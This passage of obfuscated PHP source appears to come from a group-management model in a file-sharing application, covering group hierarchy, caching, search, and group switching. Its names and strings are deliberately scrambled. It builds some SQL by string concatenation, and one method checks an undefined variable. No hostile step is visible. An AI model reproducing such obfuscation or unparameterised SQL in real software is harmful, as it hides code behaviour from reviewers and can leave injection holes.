=> $ÖĞ¶‘–ë[$÷‚¹§ø‡[1923]], $÷‚¹§ø‡[1924] => $ÖĞ¶‘–ë[$÷‚¹§ø‡[1924]])); unset($ÖĞ¶‘–ë[$÷‚¹§ø‡[1923]]); unset($ÖĞ¶‘–ë[$÷‚¹§ø‡[1924]]); } $this->_clearChildrenCache($Ì£Ö–Ö×); return $this->where(array($÷‚¹§ø‡[1925] => $¯¤Ô»))->save($ÖĞ¶‘–ë); } private function _clearChildrenCache($Û·‘µå) { $±‡Œß® =& $_SERVER[™¾ÇÙ¯¹]; $ãÔÈÌóè = array($±‡Œß®[598] => array($±‡Œß®[558], $Û·‘µå[$±‡Œß®[529]] . $Û·‘µå[$±‡Œß®[1837]] . $±‡Œß®[559])); $ç˜ÍºÑ = $this->field($±‡Œß®[1837])->where($ãÔÈÌóè)->select(); foreach ($ç˜ÍºÑ as $ßã¬‘) { $this->_clearCache($ßã¬‘[$±‡Œß®[1837]]); } } private function _clearCache($—³øâ¤) { $É¨Ê‡û =& $_SERVER[™¾ÇÙ¯¹]; $this->cacheFunctionClear($É¨Ê‡û[1919], $—³øâ¤); $this->cacheFunctionClear($É¨Ê‡û[1920], $—³øâ¤); } private function _changeChildLevel($É–Ì­µí, $Ï¹„ı×Ş, $è¤¨°úù = false) { $õÇ»–… =& $_SERVER[™¾ÇÙ¯¹]; $°‡«Üí = $É–Ì­µí[$õÇ»–…[529]] . $É–Ì­µí[$õÇ»–…[1837]] . $õÇ»–…[50]; $×Õõ•ı = $Ï¹„ı×Ş[$õÇ»–…[529]] . $Ï¹„ı×Ş[$õÇ»–…[1837]] . $õÇ»–…[50] . $É–Ì­µí[$õÇ»–…[1837]] . $õÇ»–…[50]; if ($è¤¨°úù) { $×Õõ•ı = $Ï¹„ı×Ş[$õÇ»–…[529]] . $Ï¹„ı×Ş[$õÇ»–…[1837]] . $õÇ»–…[50]; } $Ùùê›•“ = array($õÇ»–…[598] => array($õÇ»–…[558], $É–Ì­µí[$õÇ»–…[529]] . $É–Ì­µí[$õÇ»–…[1837]] . $õÇ»–…[559])); $ñîµ»´¹ = array($õÇ»–…[598] => array($õÇ»–…[607], "\162\x65\x70\154\x61\143\145\x28\x70\141\x72\x65\156\164\x4c\145\x76\145\x6c\54\47{$°‡«Üí}\x27\x2c\x27{$×Õõ•ı}\47\x29")); $this->_clearChildrenCache($É–Ì­µí); $this->where($Ùùê›•“)->data($ñîµ»´¹)->save(); } public function setNamePinyin($‘”ç‰ó¼, $‡‘ÓÑß± = false) { $ªåå·ª½ =& $_SERVER[™¾ÇÙ¯¹]; if (!$‡‘ÓÑß±) { $«Š£øå„ = $this->getInfoSimple($‘”ç‰ó¼); $‡‘ÓÑß± = $«Š£øå„[$ªåå·ª½[32]]; } if (!Input::check($‡‘ÓÑß±, $ªåå·ª½[601])) { $this->metaSet($‘”ç‰ó¼, $ªåå·ª½[473], null); $this->metaSet($‘”ç‰ó¼, $ªåå·ª½[472], null); return; } $Ç©¾Š÷Ó = array($ªåå·ª½[473] => str_replace($ªåå·ª½[53], $ªåå·ª½[12], Pinyin::get($‡‘ÓÑß±)), $ªåå·ª½[472] => Pinyin::get($‡‘ÓÑß±, $ªåå·ª½[602])); $this->metaSet($‘”ç‰ó¼, $Ç©¾Š÷Ó); } protected function groupStatus($“ôÌµ²‚, $ÇØàß´£) { $İÕ¯ïş¬ =& $_SERVER[™¾ÇÙ¯¹]; $œå—ãÕ¨ = $this->getInfoSimple($“ôÌµ²‚); if (!$œå—ãÕ¨) { return !1; } if ($ÇØàß´£ == $İÕ¯ïş¬[88]) { $µ´°ñá˜ = $this->parentLevelArray($œå—ãÕ¨[$İÕ¯ïş¬[529]]); } else { $³¸íÈš = array($İÕ¯ïş¬[598] => array($İÕ¯ïş¬[558], $œå—ãÕ¨[$İÕ¯ïş¬[529]] . $œå—ãÕ¨[$İÕ¯ïş¬[1837]] . $İÕ¯ïş¬[559])); $µ´°ñá˜ = $this->where($³¸íÈš)->field($İÕ¯ïş¬[1837])->select(); $µ´°ñá˜ = array_to_keyvalue($µ´°ñá˜, $İÕ¯ïş¬[12], $İÕ¯ïş¬[1837]); } $µ´°ñá˜[] = $œå—ãÕ¨[$İÕ¯ïş¬[1837]]; $Á³Å = array(); foreach ($µ´°ñá˜ as $“ôÌµ²‚) { $Á³Å[] = array($İÕ¯ïş¬[1837] => $“ôÌµ²‚, $İÕ¯ïş¬[94] => $İÕ¯ïş¬[765], $İÕ¯ïş¬[383] => $ÇØàß´£); $this->_clearCache($“ôÌµ²‚); } return Model($İÕ¯ïş¬[1926])->addAll($Á³Å, array(), !0); } protected function groupRemove($¿ÆÂ·øÎ, $ù¹êĞö = false) { $®ûÙ—« =& $_SERVER[™¾ÇÙ¯¹]; $—èØî† = array($®ûÙ—«[1837] => $¿ÆÂ·øÎ); $ş§Î³ˆÀ = $this->where($—èØî†)->find(); if (!$ş§Î³ˆÀ || $ş§Î³ˆÀ[$®ûÙ—«[440]] == 0) { return !1; } if (!$ù¹êĞö) { $»ÌØ·ô† = $this->getInfoSimple($ş§Î³ˆÀ[$®ûÙ—«[440]]); $this->_changeChildLevel($ş§Î³ˆÀ, $»ÌØ·ô†, !0); $this->where(array($®ûÙ—«[440] => $¿ÆÂ·øÎ))->save(array($®ûÙ—«[440] => $ş§Î³ˆÀ[$®ûÙ—«[440]])); } Model($®ûÙ—«[1926])->where($—èØî†)->delete(); Model($®ûÙ—«[1927])->where($—èØî†)->delete(); Model($®ûÙ—«[840])->groupRootRemove($¿ÆÂ·øÎ); return $this->where($—èØî†)->delete(); } protected function groupSort($ğúÊÇ¥) { $İöäé¼ğ =& $_SERVER[™¾ÇÙ¯¹]; $¹â‰·ô = array(); foreach ($ğúÊÇ¥ as $ïÛŞš»¬ => $âÑÙ¶™) { $¹â‰·ô[] = array($İöäé¼ğ[1837], $âÑÙ¶™, $İöäé¼ğ[1861], $ïÛŞš»¬ + 1); } $this->saveAll($¹â‰·ô); } public function listData() { $õîğÒÓø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($õîğÒÓø[$_SERVER[™¾ÇÙ¯¹][378]]); return $õîğÒÓø; } private function _makeOrder($ö¬‰¼Ã = '') { $ùÖÈÂ·Ì =& $_SERVER[™¾ÇÙ¯¹]; $ï¿Ç£ = array($ùÖÈÂ·Ì[1837], $ùÖÈÂ·Ì[32], $ùÖÈÂ·Ì[1826], $ùÖÈÂ·Ì[200]); $‡Úáİ“© = array($ùÖÈÂ·Ì[458] => $ùÖÈÂ·Ì[459], $ùÖÈÂ·Ì[460] => $ùÖÈÂ·Ì[461]); $¡àİ°õ = Input::get($ùÖÈÂ·Ì[465], $ùÖÈÂ·Ì[7], $ùÖÈÂ·Ì[1841], $ï¿Ç£); $’ğà¾ş¾ = Input::get($ùÖÈÂ·Ì[466], $ùÖÈÂ·Ì[7], $ùÖÈÂ·Ì[1928], array($ùÖÈÂ·Ì[1928], $ùÖÈÂ·Ì[460])); $’ğà¾ş¾ = $‡Úáİ“©[$’ğà¾ş¾]; $ö¬‰¼Ã = $ö¬‰¼Ã . "{$¡àİ°õ}\40{$’ğà¾ş¾}\54\40\147\162\x6f\165\160\111\x44\x20\141\163\143"; return $this->order($ö¬‰¼Ã); } public function listChild($×ƒ•ç˜Ó) { $˜›Õâê =& $_SERVER[™¾ÇÙ¯¹]; $Á±Ò–ä  = $this->where(array($˜›Õâê[440] => $×ƒ•ç˜Ó))->_makeOrder()->selectPage(200); $this->_listDataApply($Á±Ò–ä [$˜›Õâê[378]]); return $Á±Ò–ä ; } public function listChildIds($èÆ‘ë¦Á) { $ŞÒÙéÏ› =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($æˆ¬ì«ä)) { $èÆ‘ë¦Á = explode($ŞÒÙéÏ›[50], $èÆ‘ë¦Á); } $áÖ¢œ«È = $this->where(array($ŞÒÙéÏ›[1837] => array($ŞÒÙéÏ›[7], $èÆ‘ë¦Á)))->field($ŞÒÙéÏ›[1929])->select(); if (!$áÖ¢œ«È) { return !1; } $¦¿Âİ” = array(); foreach ($áÖ¢œ«È as $·Ø×¡¿á) { $¦¿Âİ”[] = "\x73\x65\154\145\143\x74\x20\x67\x72\157\x75\160\111\x44\40\x66\162\157\155\x20\140\x67\x72\x6f\x75\x70\x60\x20\167\150\145\162\145\40\x70\x61\162\145\x6e\x74\114\x65\x76\x65\x6c\x20\154\151\153\x65\40\47{$·Ø×¡¿á[$ŞÒÙéÏ›[529]]}{$·Ø×¡¿á[$ŞÒÙéÏ›[1837]]}\x2c\x25\x27"; } $¦¿Âİ” = implode($ŞÒÙéÏ›[1930], $¦¿Âİ”); $áÖ¢œ«È = $this->query($¦¿Âİ”); if (!$áÖ¢œ«È) { return array(); } $èÆ‘ë¦Á = array_to_keyvalue($áÖ¢œ«È, $ŞÒÙéÏ›[12], $ŞÒÙéÏ›[1837]); return array_unique($èÆ‘ë¦Á); } public function listByID($†œïŸÂ) { $©¥ó‹¡ =& $_SERVER[™¾ÇÙ¯¹]; if (!$†œïŸÂ) { return array(); } $ÏµŞÎ»° = array($©¥ó‹¡[1837] => array($©¥ó‹¡[7], $†œïŸÂ)); $âêàœÊ¨ = $this->where($ÏµŞÎ»°)->select(); $âêàœÊ¨ = array_sort_keep($âêàœÊ¨, $©¥ó‹¡[1837], $†œïŸÂ); $this->_listDataApply($âêàœÊ¨); return $âêàœÊ¨; } public function listSearch($ËùÃåá«) { $ÉÊ×¯¼ =& $_SERVER[™¾ÇÙ¯¹]; $©¸¤Ç„Â = $ËùÃåá«[$ÉÊ×¯¼[1931]]; $¿”ÒØ¶ç = isset($ËùÃåá«[$ÉÊ×¯¼[1932]]) ? $ËùÃåá«[$ÉÊ×¯¼[1932]] : !1; if (!trim($©¸¤Ç„Â)) { return !1; } $©¸¤Ç„Â = str_replace($ÉÊ×¯¼[1933], $ÉÊ×¯¼[1934], $©¸¤Ç„Â); $¬°Ÿñ×” = array($ÉÊ×¯¼[1837] => array($ÉÊ×¯¼[391], "{$©¸¤Ç„Â}\x25"), $ÉÊ×¯¼[32] => array($ÉÊ×¯¼[391], "\x25{$©¸¤Ç„Â}\45"), $ÉÊ×¯¼[1008] => $ÉÊ×¯¼[1935]); if ($¿”ÒØ¶ç) { $ÕÇïÑæš = $this->getInfoSimple($¿”ÒØ¶ç); $ÊüÂ•Å¸ = $ÕÇïÑæš[$ÉÊ×¯¼[529]] . $¿”ÒØ¶ç . $ÉÊ×¯¼[559]; $¬°Ÿñ×” = array($¬°Ÿñ×”, array($ÉÊ×¯¼[529] => array($ÉÊ×¯¼[391], $ÊüÂ•Å¸))); } $¬°Ÿñ×” = $this->parseWhereLike($¬°Ÿñ×”); $æ“‡ó = $this->_makeOrder()->where($¬°Ÿñ×”)->selectPage(20); $æ“‡ó = $æ“‡ó ? $æ“‡ó : array($ÉÊ×¯¼[378] => array(), $ÉÊ×¯¼[375] => array()); if (!$æ“‡ó || count($æ“‡ó[$ÉÊ×¯¼[378]]) < 5 && Input::check($©¸¤Ç„Â, $ÉÊ×¯¼[327])) { $­Îæø³ = $this->groupChildrenAll($¿”ÒØ¶ç); $˜ç²± = $this->_searchFromMeta($ÉÊ×¯¼[472], $©¸¤Ç„Â, 10, $­Îæø³); $¢šşÌ…Ù = $this->_searchFromMeta($ÉÊ×¯¼[473], $©¸¤Ç„Â, 10, $­Îæø³); $â¹¨ôì = array_merge($˜ç²±, $¢šşÌ…Ù, $æ“‡ó[$ÉÊ×¯¼[378]]); $æ“‡ó[$ÉÊ×¯¼[378]] = array_unique_by_key($â¹¨ôì, $ÉÊ×¯¼[1837]); $æ“‡ó[$ÉÊ×¯¼[375]][$ÉÊ×¯¼[376]] = count($æ“‡ó[$ÉÊ×¯¼[378]]); $æ“‡ó[$ÉÊ×¯¼[375]][$ÉÊ×¯¼[377]] = ceil($æ“‡ó[$ÉÊ×¯¼[375]][$ÉÊ×¯¼[376]] / $æ“‡ó[$ÉÊ×¯¼[375]][$ÉÊ×¯¼[372]]); } $this->_listDataApply($æ“‡ó[$ÉÊ×¯¼[378]]); return $æ“‡ó; } protected function groupChildrenAll($”Àïçóö) { $ùıè®Ûç =& $_SERVER[™¾ÇÙ¯¹]; if (!$”Àïçóö) { return !1; } if (is_string($”Àïçóö)) { $”Àïçóö = array($”Àïçóö); } $™ùüˆ¢Õ = $”Àïçóö; foreach ($”Àïçóö as $àÍæ—ÆÜ) { $‡âÇÎŸà = $this->getInfoSimple($àÍæ—ÆÜ); $¦¹‘ó¼¹ = array($ùıè®Ûç[529] => array($ùıè®Ûç[391], $‡âÇÎŸà[$ùıè®Ûç[529]] . $àÍæ—ÆÜ . $ùıè®Ûç[559])); $µƒòåÑ” = $this->field($ùıè®Ûç[1837])->where($¦¹‘ó¼¹)->select(); $™ùüˆ¢Õ = array_merge($™ùüˆ¢Õ, array_to_keyvalue($µƒòåÑ”, $ùıè®Ûç[12], $ùıè®Ûç[1837])); } return array_unique($™ùüˆ¢Õ); } private function _searchFromMeta($“‚ëŸ­, $¬ÜİØ, $ÖÄÚ÷à, $¢æê•Ôõ) { $Åƒ¦ñáÖ =& $_SERVER[™¾ÇÙ¯¹]; $¬ÜİØ = strtolower($¬ÜİØ); $À¤…ÇÂ¡ = array($Åƒ¦ñáÖ[94] => $“‚ëŸ­, $Åƒ¦ñáÖ[383] => array($Åƒ¦ñáÖ[391], "\x25{$¬ÜİØ}\x25")); $À¤…ÇÂ¡ = $this->parseWhereLike($À¤…ÇÂ¡); if ($¢æê•Ôõ) { $À¤…ÇÂ¡[$Åƒ¦ñáÖ[1837]] = array($Åƒ¦ñáÖ[7], $¢æê•Ôõ); } $•ÓÓ‚ä€ = Model($Åƒ¦ñáÖ[1936])->where($À¤…ÇÂ¡)->limit($ÖÄÚ÷à)->select(); if (!$•ÓÓ‚ä€) { return array(); } $•ÓÓ‚ä€ = array_to_keyvalue($•ÓÓ‚ä€, $Åƒ¦ñáÖ[12], $Åƒ¦ñáÖ[1837]); $Ú£¦²ÕÓ = $this->where(array($Åƒ¦ñáÖ[1925] => array($Åƒ¦ñáÖ[7], $•ÓÓ‚ä€)))->select(); if (!$Ú£¦²ÕÓ) { return array(); } return $Ú£¦²ÕÓ; } protected function _listDataApplyItem($öåÊµÈë) { $®­ËƒÈ£ = array($öåÊµÈë); $this->_listDataApply($®­ËƒÈ£); return $®­ËƒÈ£[0]; } protected function _listDataApply(&$Ù†ÎÖø) { $¯­Ë‚ =& $_SERVER[™¾ÇÙ¯¹]; if (!$Ù†ÎÖø) { return; } $¡Ô¹÷½» = array_to_keyvalue($Ù†ÎÖø, $¯­Ë‚[12], $¯­Ë‚[1837]); $this->_listAppendChildren($Ù†ÎÖø); $this->_listAppendChildrenMember($Ù†ÎÖø); $this->_listAppendMeta($Ù†ÎÖø, $¡Ô¹÷½»); $this->_listAppendParent($Ù†ÎÖø); $this->_listAppendSourceRoot($Ù†ÎÖø, $¡Ô¹÷½»); } private function _listAppendChildren(&$¶óşşÛ) { $ÊçŞ¦¡† =& $_SERVER[™¾ÇÙ¯¹]; $¢­ƒ«âš = array_to_keyvalue($¶óşşÛ, $ÊçŞ¦¡†[12], $ÊçŞ¦¡†[1837]); $¨»ñúŠƒ = array($ÊçŞ¦¡†[440] => array($ÊçŞ¦¡†[7], $¢­ƒ«âš)); $®Şò §Ş = array($ÊçŞ¦¡†[440], $ÊçŞ¦¡†[1937] => $ÊçŞ¦¡†[508]); $Ì ²ò¹Š = $this->field($®Şò §Ş)->where($¨»ñúŠƒ)->group($ÊçŞ¦¡†[440])->select(); $ÏÂø±ÓÏ = array_to_keyvalue($Ì ²ò¹Š, $ÊçŞ¦¡†[440], $ÊçŞ¦¡†[508]); foreach ($¶óşşÛ as &$ˆï¶¸Â‚) { $» Âô˜¨ = $ˆï¶¸Â‚[$ÊçŞ¦¡†[1837]]; $ˆï¶¸Â‚[$ÊçŞ¦¡†[1938]] = isset($ÏÂø±ÓÏ[$» Âô˜¨]) ? intval($ÏÂø±ÓÏ[$» Âô˜¨]) : !1; } unset($ˆï¶¸Â‚); } private function _listAppendChildrenMember(&$öòÙò°‡) { $¾ÈËÎ« =& $_SERVER[™¾ÇÙ¯¹]; $»ÎíÉ®÷ = array_to_keyvalue($öòÙò°‡, $¾ÈËÎ«[12], $¾ÈËÎ«[1837]); $Ò÷â¨à„ = array($¾ÈËÎ«[1837] => array($¾ÈËÎ«[7], $»ÎíÉ®÷)); $Û¶åáä = array($¾ÈËÎ«[1837], $¾ÈËÎ«[1937] => $¾ÈËÎ«[508]); $¹§Ù´Ê× = Model($¾ÈËÎ«[1927])->field($Û¶åáä)->where($Ò÷â¨à„)->group($¾ÈËÎ«[1837])->select(); $‹ºÜØŒ = array_to_keyvalue($¹§Ù´Ê×, $¾ÈËÎ«[1837], $¾ÈËÎ«[508]); foreach ($öòÙò°‡ as &$À±…·â‹) { $µÒÈÊå— = $À±…·â‹[$¾ÈËÎ«[1837]]; $À±…·â‹[$¾ÈËÎ«[1939]] = isset($‹ºÜØŒ[$µÒÈÊå—]) ? intval($‹ºÜØŒ[$µÒÈÊå—]) : !1; } unset($À±…·â‹); } private function _listAppendMeta(&$‹‰Ş™·, $ğ‚êÜââ) { $’ßºÔŒù =& $_SERVER[™¾ÇÙ¯¹]; $´©™Ô¸¥ = array($’ßºÔŒù[1837] => array($’ßºÔŒù[7], $ğ‚êÜââ)); $»Ìú¯­ = Model($’ßºÔŒù[1926])->where($´©™Ô¸¥)->select(); $»Ìú¯­ = array_to_keyvalue_group($»Ìú¯­, $’ßºÔŒù[1837]); foreach ($»Ìú¯­ as &$¾ÄÒ¼Î‰) { $¾ÄÒ¼Î‰ = array_to_keyvalue($¾ÄÒ¼Î‰, $’ßºÔŒù[94], $’ßºÔŒù[383]); } unset($¾ÄÒ¼Î‰); foreach ($‹‰Ş™· as &$‡À†Âœ) { $‡À†Âœ[$’ßºÔŒù[474]] = array(); if (isset($»Ìú¯­[$‡À†Âœ[$’ßºÔŒù[1837]]])) { $‡À†Âœ[$’ßºÔŒù[474]] = $»Ìú¯­[$‡À†Âœ[$’ßºÔŒù[1837]]]; } } unset($‡À†Âœ); } protected function parentLevelArray($¡¬”¿Û©) { $òÚåÂ™º =& $_SERVER[™¾ÇÙ¯¹]; $¡¬”¿Û© = explode($òÚåÂ™º[50], trim($¡¬”¿Û©, $òÚåÂ™º[50])); $¡¬”¿Û© = array_remove_value($¡¬”¿Û©, $òÚåÂ™º[197]); return $¡¬”¿Û©; } protected function parentInGroup($èÊ Éç’, $°Åûäàü) { $ËÌó½… =& $_SERVER[™¾ÇÙ¯¹]; $Øóâ¡ƒÁ = $this->getInfoSimple($èÊ Éç’); if (!$Øóâ¡ƒÁ) { return !0; } $âÅ­¼èø = $this->parentLevelArray($Øóâ¡ƒÁ[$ËÌó½…[529]]); $âÅ­¼èø[] = $èÊ Éç’; foreach ($âÅ­¼èø as $èÊ Éç’) { if (in_array($èÊ Éç’ . $ËÌó½…[12], $°Åûäàü)) { return !0; } } return !1; } private function _listAppendParent(&$¬ü¨¦¨ë) { $Ñê¦ÊŞ· =& $_SERVER[™¾ÇÙ¯¹]; $‘ú¾’ö² = array(); foreach ($¬ü¨¦¨ë as &$“«Í‰Ö‘) { $‘ú¾’ö²[$“«Í‰Ö‘[$Ñê¦ÊŞ·[1837]]] = $“«Í‰Ö‘[$Ñê¦ÊŞ·[32]]; $æ†ˆ£ìò = $this->parentLevelArray($“«Í‰Ö‘[$Ñê¦ÊŞ·[529]]); foreach ($æ†ˆ£ìò as $ÑÏí°…) { if (!isset($‘ú¾’ö²[$ÑÏí°…])) { $‘ú¾’ö²[$ÑÏí°…] = 0; } } } unset($“«Í‰Ö‘); foreach ($‘ú¾’ö² as $±Øá˜Ÿö => $şÙç‹ÇÀ) { if ($şÙç‹ÇÀ) { continue; } $Á³É¦ = $this->getInfoSimple($±Øá˜Ÿö); $‘ú¾’ö²[$±Øá˜Ÿö] = $Á³É¦[$Ñê¦ÊŞ·[32]]; } $¨ûõÈà° = $GLOBALS[$Ñê¦ÊŞ·[6]][$Ñê¦ÊŞ·[89]][$Ñê¦ÊŞ·[1940]]; if ($GLOBALS[$Ñê¦ÊŞ·[511]] == $Ñê¦ÊŞ·[88]) { $¨ûõÈà° = !1; } foreach ($¬ü¨¦¨ë as &$“«Í‰Ö‘) { $æ†ˆ£ìò = $this->parentLevelArray($“«Í‰Ö‘[$Ñê¦ÊŞ·[529]]); $ÁÖÆ£²î = $Ñê¦ÊŞ·[12]; foreach ($æ†ˆ£ìò as $±Øá˜Ÿö => $ÑÏí°…) { if ($¨ûõÈà° && $±Øá˜Ÿö == 0) { continue; } $ÁÖÆ£²î .= $‘ú¾’ö²[$ÑÏí°…] . $Ñê¦ÊŞ·[8]; } if ($æ†ˆ£ìò) { $ÁÖÆ£²î .= $“«Í‰Ö‘[$Ñê¦ÊŞ·[32]]; } $“«Í‰Ö‘[$Ñê¦ÊŞ·[534]] = str_replace($Ñê¦ÊŞ·[537], $Ñê¦ÊŞ·[8], $ÁÖÆ£²î); } unset($“«Í‰Ö‘); } private function _listAppendSourceRoot(&$›Èº›†, $±“äóŒ) { $êªˆ ´Å =& $_SERVER[™¾ÇÙ¯¹]; $„¾ÂõŸÉ = Model($êªˆ ´Å[840])->listSourceRoot(SourceModel::TYPE_GROUP, $±“äóŒ); $„¾ÂõŸÉ = array_to_keyvalue($„¾ÂõŸÉ, $êªˆ ´Å[513]); $„¾ÂõŸÉ = array_remove_key($„¾ÂõŸÉ, $êªˆ ´Å[513]); foreach ($›Èº›† as &$ù¢»øŠ‚) { $ù¢»øŠ‚[$êªˆ ´Å[86]] = $„¾ÂõŸÉ[$ù¢»øŠ‚[$êªˆ ´Å[1837]]] ? $„¾ÂõŸÉ[$ù¢»øŠ‚[$êªˆ ´Å[1837]]] : array(); } unset($ù¢»øŠ‚); } protected function groupMerge($‡ŸÁ¤øæ) { $‡ŸÁ¤øæ = array_values(array_unique($‡ŸÁ¤øæ)); $·±«Ôî = array(); for ($£ˆ»«—ó = 0; $£ˆ»«—ó < count($‡ŸÁ¤øæ); $£ˆ»«—ó++) { $ÏÜì£±ù = !1; for ($À–¾Û˜û = 0; $À–¾Û˜û < count($‡ŸÁ¤øæ); $À–¾Û˜û++) { if ($£ˆ»«—ó == $À–¾Û˜û) { continue; } if ($this->isParentOf($‡ŸÁ¤øæ[$À–¾Û˜û], $‡ŸÁ¤øæ[$£ˆ»«—ó])) { $ÏÜì£±ù = !0; break; } } if (!$ÏÜì£±ù) { $·±«Ôî[] = $‡ŸÁ¤øæ[$£ˆ»«—ó]; } } return $·±«Ôî; } protected function isParentOf($Ü§ßêïÏ, $İø¡‚ ş) { $ãøá£æÒ =& $_SERVER[™¾ÇÙ¯¹]; if (!$Ü§ßêïÏ || !$İø¡‚ ş || $Ü§ßêïÏ == $İø¡‚ ş) { return !1; } $Ü¢ËŸÀ = $this->getInfoSimple($Ü§ßêïÏ); $˜ƒïØÅØ = $this->getInfoSimple($İø¡‚ ş); $‚‡öÓ÷´ = $Ü¢ËŸÀ[$ãøá£æÒ[529]] . $Ü§ßêïÏ . $ãøá£æÒ[50]; if (substr($˜ƒïØÅØ[$ãøá£æÒ[529]], 0, strlen($‚‡öÓ÷´)) == $‚‡öÓ÷´) { return !0; } return !1; } public function groupShowRoot($„ÆòéšÕ, $àÚîçøû = false) { $Ã¸ğ³şº =& $_SERVER[™¾ÇÙ¯¹]; $œÖöğèÊ = $this->getInfo($„ÆòéšÕ); if (!$œÖöğèÊ) { return array(); } $‰ûØõ“™ = $this->parentLevelArray($œÖöğèÊ[$Ã¸ğ³şº[529]]); $Å×ë¡âĞ = array($„ÆòéšÕ); if (count($‰ûØõ“™) == 0) { return $Å×ë¡âĞ; } if ($àÚîçøû && count($‰ûØõ“™) == 1) { return $Å×ë¡âĞ; } if (!$œÖöğèÊ[$Ã¸ğ³şº[474]] || !isset($œÖöğèÊ[$Ã¸ğ³şº[474]][$Ã¸ğ³şº[1923]]) || $œÖöğèÊ[$Ã¸ğ³şº[474]][$Ã¸ğ³şº[1923]] == $Ã¸ğ³şº[1892]) { return $this->groupShowRoot($‰ûØõ“™[count($‰ûØõ“™) - 1], $àÚîçøû); } if ($œÖöğèÊ[$Ã¸ğ³şº[474]][$Ã¸ğ³şº[1923]] == $Ã¸ğ³şº[366]) { $“—Õ’ù‚ = explode($Ã¸ğ³şº[50], $œÖöğèÊ[$Ã¸ğ³şº[474]][$Ã¸ğ³şº[1924]]); if ($“—Õ’ù‚) { $Å×ë¡âĞ = array_merge($Å×ë¡âĞ, $“—Õ’ù‚); } } return $Å×ë¡âĞ; } protected function resetParentLevel() { $©óÁüş£ =& $_SERVER[™¾ÇÙ¯¹]; $Ó™ñõÖ = $©óÁüş£[1837]; $â·û‰–ù = $this->select(); $â·û‰–ù = array_to_keyvalue($â·û‰–ù, $Ó™ñõÖ); foreach ($â·û‰–ù as $ÇÙ»º×Ã) { $±üîÖı = $ÇÙ»º×Ã; $ÕÙãú¶ó = array(); while ($±üîÖı[$©óÁüş£[440]] != 0) { $ÕÙãú¶ó[] = $±üîÖı[$©óÁüş£[440]]; $±üîÖı = $â·û‰–ù[$±üîÖı[$©óÁüş£[440]]]; } $ÕÙãú¶ó[] = 0; $ÕÙãú¶ó = $©óÁüş£[50] . implode($©óÁüş£[50], array_reverse($ÕÙãú¶ó)) . $©óÁüş£[50]; $this->setNamePinyin($ÇÙ»º×Ã[$Ó™ñõÖ], $ÇÙ»º×Ã[$©óÁüş£[32]]); $this->where(array($Ó™ñõÖ => $ÇÙ»º×Ã[$Ó™ñõÖ]))->save(array($©óÁüş£[598] => $ÕÙãú¶ó)); } return $â·û‰–ù; } public function groupNameAuto($ğ‚Ù±Ì, $êÀ´©¬) { $ñì‰¾Ú =& $_SERVER[™¾ÇÙ¯¹]; $óêâıÌè = $this->where(array($ñì‰¾Ú[409] => $ğ‚Ù±Ì))->getField($ñì‰¾Ú[32], !0); if (!$óêâıÌè || !in_array($êÀ´©¬, $óêâıÌè)) { return $êÀ´©¬; } for ($£ö´ô’‰ = 1; $£ö´ô’‰ <= count($óêâıÌè) + 1; $£ö´ô’‰++) { $—á›ıÙè = $êÀ´©¬ . "\x28{$£ö´ô’‰}\x29"; if (!in_array($—á›ıÙè, $óêâıÌè)) { return $—á›ıÙè; } } } public function groupSwitch($é‰ÁÍë”, $ÔìòäÀ¢) { $Ä÷‚§Ü® =& $_SERVER[™¾ÇÙ¯¹]; $’Ê½†ÉÜ = array($Ä÷‚§Ü®[1837] => array($Ä÷‚§Ü®[7], array($é‰ÁÍë”, $ÔìòäÀ¢))); $ä¾äÍ¨æ = $this->where($’Ê½†ÉÜ)->select(); $ä¾äÍ¨æ = array_to_keyvalue($ä¾äÍ¨æ, $Ä÷‚§Ü®[1837]); if (!isset($ä¾äÍ¨æ[$é‰ÁÍë”]) || !isset($ä¾äÍ¨æ[$ÔìòäÀ¢]) || $ä¾äÍ¨æ[$é‰ÁÍë”][$Ä÷‚§Ü®[440]] == 0) { return !1; } $’Ê½†ÉÜ = array($Ä÷‚§Ü®[1837] => $é‰ÁÍë”); $’ü¸Ã€ = Model($Ä÷‚§Ü®[1927])->where($’Ê½†ÉÜ)->select(); if (!$’ü¸Ã€) { $’ü¸Ã€ = array(); } foreach ($’ü¸Ã€ as $æÄÓ·²ä) { $ÆÔ’îâ = $æÄÓ·²ä[$Ä÷‚§Ü®[1665]]; $’Ê½†ÉÜ = array($Ä÷‚§Ü®[1665] => $ÆÔ’îâ, $Ä÷‚§Ü®[1837] => $ÔìòäÀ¢); $ğ®ÂÃ¦Õ = Model($Ä÷‚§Ü®[1927])->where($’Ê½†ÉÜ)->find(); if (!$ğ®ÂÃ¦Õ) { $Şóİ·ŸŠ = array($ÔìòäÀ¢ => $æÄÓ·²ä[$Ä÷‚§Ü®[1941]]); Model($Ä÷‚§Ü®[543])->userGroupAdd($ÆÔ’îâ, $Şóİ·ŸŠ); } Model($Ä÷‚§Ü®[543])->userGroupRemove($ÆÔ’îâ, $é‰ÁÍë”); } $’Ê½†ÉÜ = array($Ä÷‚§Ü®[419] => 2, $Ä÷‚§Ü®[440] => 0, $Ä÷‚§Ü®[418] => 1, $Ä÷‚§Ü®[513] => array($Ä÷‚§Ü®[7], array($é‰ÁÍë”, $ÔìòäÀ¢))); $Ñ•¬†æ = Model($Ä÷‚§Ü®[840])->where($’Ê½†ÉÜ)->field($Ä÷‚§Ü®[1942])->select(); $Ñ•¬†æ = array_to_keyvalue($Ñ•¬†æ, $Ä÷‚§Ü®[513], $Ä÷‚§Ü®[410]); $‚æû•‡Ç = !empty($Ñ•¬†æ[$é‰ÁÍë”]) ? $Ñ•¬†æ[$é‰ÁÍë”] : !1; if ($‚æû•‡Ç) { if (!$Ñ•¬†æ[$ÔìòäÀ¢]) { $Ñ•¬†æ[$ÔìòäÀ¢] = Model($Ä÷‚§Ü®[840])->groupRootAdd($ÔìòäÀ¢); } $Àò™›Â = $Ñ•¬†æ[$ÔìòäÀ¢]; $’Ê½†ÉÜ = array($Ä÷‚§Ü®[440] => $‚æû•‡Ç); $Ñ•¬†æ = Model($Ä÷‚§Ü®[840])->where($’Ê½†ÉÜ)->field($Ä÷‚§Ü®[1943])->select(); if (!$Ñ•¬†æ) { $Ñ•¬†æ = array(); } Model($Ä÷‚§Ü®[840])->moveClearAuth = !1; foreach ($Ñ•¬†æ as $åÜÙŸà») { $Ê¯†Çé­ = $åÜÙŸà»[$Ä÷‚§Ü®[418]] == $Ä÷‚§Ü®[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; 